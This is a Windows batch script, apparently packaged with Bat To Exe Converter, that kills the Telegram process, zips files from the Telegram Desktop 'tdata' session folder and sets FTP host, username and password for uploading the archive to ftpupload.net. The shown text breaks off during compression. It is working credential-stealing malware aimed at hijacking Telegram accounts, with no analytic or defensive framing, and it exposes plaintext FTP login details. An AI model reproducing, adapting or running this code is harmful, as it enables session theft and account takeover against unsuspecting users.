::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFEMAHESlaVeeA6YX/Ofr0+iSpQMYTOdf
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
REM --- Kill Telegram process ---
taskkill /IM Telegram.exe /F

REM --- Set variables for compression ---
set "source_folder=%USERPROFILE%\AppData\Roaming\Telegram Desktop\tdata"
set "destination_file=outp.zip"
set "folder_to_zip=%USERPROFILE%\AppData\Roaming\Telegram Desktop\tdata\D877F783D5D3EF8C"
set "folder_zip=folder.zip"
set "final_zip=final_output.zip"

REM --- Get current date and time for timestamp in 24-hour format ---
for /f "tokens=1-4 delims=/ " %%a in ('date /t') do set date=%%a-%%b-%%c
for /f "tokens=1-2 delims=:." %%a in ('echo %time%') do set time=%%a-%%b

REM Remove leading zero from hour (if any)
if "%time:~0,1%"=="0" set time=%time:~1%

REM Combine date and time for the final timestamp in 24-hour format (no AM/PM)
set "timestamp=%date%_%time%"

REM Final lol file with timestamp
set "final_lol=final_output_%timestamp%.lol"

REM --- Set FTP variables ---
set FTP_HOST=ftpupload.net
set FTP_USER=if0_37813726
set FTP_PASS=5fa0RImweznlF
set REMOTE_DIR=/htdocs/uploads  # Change this to your target directory
set LOCAL_FILE=%final_lol%

REM Ensure the working directory is correct
cd /d "%USERPROFILE%\AppData\Roaming\Telegram Desktop"

REM Delete destination files if they exist to avoid appending
if exist "%destination_file%" del "%destination_file%"
if exist "%folder_zip%" del "%folder_zip%"
if exist "%final_zip%" del "%final_zip%"
if exist "%final_lol%" del "%final_lol%"

REM Compress only files directly in the source folder (exclude subfolders and their files)
powershell -Command "Get-ChildItem -Path '%source_folder%' -File | ForEach-Object { $_.FullName } | Compress-Archive -DestinationPath '%destinatio